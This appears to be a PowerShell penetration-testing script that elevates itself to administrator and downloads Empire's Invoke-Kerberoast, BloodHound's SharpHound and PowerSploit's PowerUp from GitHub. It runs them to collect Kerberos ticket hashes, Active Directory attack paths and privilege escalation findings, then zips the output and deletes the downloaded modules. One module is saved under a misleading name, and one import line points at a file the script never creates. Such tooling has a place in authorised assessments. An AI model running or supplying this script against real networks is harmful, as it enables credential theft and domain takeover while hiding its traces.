<# 
Active Directory Assessment and Privilege Escalation Script
Developed by Hausec
Credit for scripts goes to Tim Medin, the people working on Empire, BloodHound, and PowerSploit 
#>

#run as admin check
If (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator"))
{   
$arguments = "& '" + $myinvocation.mycommand.definition + "'"
Start-Process powershell -Verb runAs -ArgumentList $arguments
Break
}
#create folder 
$path = "C:\Capture"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
#create folder for PS Modules
$path = "C:\Program Files\WindowsPowerShell\Modules\IEAssessment"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
#download Kerberoast
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1","C:\Program Files\WindowsPowerShell\Modules\IEAssessment\IEAssessment.ps1")
#Run Kerberoast
Import-Module test.ps1
Invoke-Kerberoast | Out-File C:\Capture\Kerberoast.txt

#SharpHound
$path = "C:\Program Files\WindowsPowerShell\Modules\SharpHound"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1","C:\Program Files\WindowsPowerShell\Modules\SharpHound\SharpHound.ps1")
Import-Module SharpHound.ps1
Invoke-BloodHound -CSVFolder C:\Capture
#PrivEsc
$path = "C:\Program Files\WindowsPowerShell\Modules\PrivEsc"
If(!(test-path $path))
{
      New-Item -ItemType Directory -Force -Path $path
}
$client = New-Object System.Net.WebClient
$client.DownloadFile("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1","C:\Program Files\WindowsPowerShell\Modules\PrivEsc\PrivEsc.ps1")
Import-Module PrivEsc.ps1
Invoke-AllChecks | Out-File C:\Capture\PrivEsc.txt

#Zip it all up and remove leftovers
Compress-Archive -Path C:\Capture -Update -DestinationPath C:\Capture.zip
Remove-Item -Recurse -Force "C:\Program Files\WindowsPowerShell\Modules\IEAssessment"
Remove-Item -Recurse -Force "C:\Program Files\WindowsPowerShell\Modules\PrivEsc"
Remove-Item -Recurse -Force "C:\Program Files\WindowsPowerShell\Modules\SharpHound"
Remove-Item -Recurse -Force "C:\Capture"






